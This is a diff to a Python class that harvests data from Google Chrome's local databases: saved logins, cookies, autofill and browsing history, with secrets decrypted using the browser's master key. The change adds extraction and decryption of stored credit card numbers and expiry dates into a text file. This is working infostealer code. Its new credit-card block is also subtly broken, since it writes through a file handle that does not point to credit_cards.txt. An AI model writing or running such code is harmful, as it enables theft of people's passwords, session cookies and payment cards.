@@ -35,7 +35,7 @@ class Chrome:
             return str(e)
 
     @staticmethod
-    def _convert_time(time):
+    def convert_time(time):
         epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
         code_stamp = epoch + timedelta(microseconds=time)
         return code_stamp.strftime('%Y/%m/%d - %H:%M:%S')
@@ -47,7 +47,6 @@ class Chrome:
             shutil.copy2(login_db, login_db_copy)
             conn = sqlite3.connect(login_db_copy)
             cursor = conn.cursor()
-            
             try:
                 cursor.execute("SELECT action_url, username_value, password_value FROM logins")
 
@@ -75,7 +74,6 @@ class Chrome:
             shutil.copy2(cookies_db, cookies_db_copy)
             conn = sqlite3.connect(cookies_db_copy)
             cursor = conn.cursor()
-            
             try:
                 cursor.execute("SELECT host_key, name, encrypted_value from cookies")
 
@@ -95,10 +93,10 @@ class Chrome:
         except Exception as e:
             print(f"[!]Error: {e}")
 
-    def autofill(self):
+    def web_data(self):
         try:
             web_data_db = self._user_data + "\\Default\\Web Data"
-            web_data_db_copy = os.getenv("TEMP") + "\\Web Data.db"
+            web_data_db_copy = os.getenv("TEMP") + "\\Web.db"
             shutil.copy2(web_data_db, web_data_db_copy)
             conn = sqlite3.connect(web_data_db_copy)
             cursor = conn.cursor()
@@ -111,6 +109,17 @@ class Chrome:
                         name = item[0]
                         value = item[1]
                         f.write(f"{name}: {value}")
+
+                cursor.execute("SELECT * FROM credit_cards")
+
+                with open("credit_cards.txt", "w"):
+                    for item in cursor.fetchall():
+                        username = item[1]
+                        encrypted_password = item[4]
+                        decrypted_password = self._decrypt(encrypted_password, self._master_key)
+                        expire_mon = item[2]
+                        expire_year = item[3]
+                        f.write(f"USR: {username}\nPDW: {decrypted_password}\nEXP: {expire_mon}/{expire_year}\n\n")
 
             except sqlite3.Error:
                 pass
@@ -139,11 +148,11 @@ class Chrome:
 
                 cursor.execute('SELECT title, url, last_visit_time FROM urls')
 
-                with open("web_history.txt", "w") as f:
+                with open("search_history.txt", "w") as f:
                     for item in cursor.fetchall():
                         title = item[0]
                         url = item[1]
-                        last_time = self._convert_time(item[2])
+                        last_time = self.convert_time(item[2])
                         f.write(f"Title: {title}\nUrl: {url}\nLast Time Visit: {last_time}\n\n")
 
             except sqlite3.Error:
@@ -161,4 +170,4 @@ if __name__ == "__main__":
     chrome.passwords()
     chrome.cookies()
     chrome.history()
-    chrome.autofill()
+    chrome.web_data()
